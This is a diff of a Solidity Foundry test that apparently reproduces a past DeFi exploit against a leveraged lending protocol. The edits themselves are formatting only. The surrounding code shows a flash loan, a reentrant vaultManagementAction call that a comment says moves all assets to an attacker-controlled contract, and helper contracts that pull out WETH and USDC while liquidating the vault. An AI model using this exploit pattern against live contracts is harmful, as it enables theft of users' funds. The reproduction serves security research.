@@ -20,10 +20,13 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IFactory {
+
     function createVault(uint256 salt, uint16 vaultVersion, address baseCurrency) external returns (address vault);
+
 }
 
 interface LendingPool {
+
     function doActionWithLeverage(
         uint256 amountBorrowed,
         address vault,
@@ -32,9 +35,11 @@ interface LendingPool {
         bytes3 referrer
     ) external;
     function liquidateVault(address vault) external;
+
 }
 
 interface IVault {
+
     function vaultManagementAction(
         address actionHandler,
         bytes calldata actionData
@@ -45,11 +50,13 @@ interface IVault {
         uint256[] calldata assetAmounts
     ) external;
     function openTrustedMarginAccount(address creditor) external;
+
 }
 
 interface IActionMultiCall {}
 
 contract ContractTest is Test {
+
     struct ActionData {
         address[] assets; // Array of the contract addresses of the assets.
         uint256[] assetIds; // Array of the IDs of the assets.
@@ -85,7 +92,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 29_847_813_623_947_075_968;
         amounts[1] = 11_916_676_700;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
@@ -241,9 +248,11 @@ contract ContractTest is Test {
         bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
         Proxy2.vaultManagementAction(address(ActionMultiCall), callData2); // transfer all the asset to his own controlled contract and re-entry the function liquidateVault to liquidiate the vault
     }
+
 }
 
 contract Helper1 {
+
     address owner;
     address proxy;
     address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
@@ -259,9 +268,11 @@ contract Helper1 {
         WETH.transferFrom(ActionMultiCall, owner, WETH.balanceOf(address(ActionMultiCall)));
         darcWETH.liquidateVault(proxy);
     }
+
 }
 
 contract Helper2 {
+
     address proxy;
     address owner;
     address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
@@ -277,4 +288,5 @@ contract Helper2 {
         USDC.transferFrom(ActionMultiCall, owner, USDC.balanceOf(address(ActionMultiCall)));
         darcUSDC.liquidateVault(proxy);
     }
+
 }
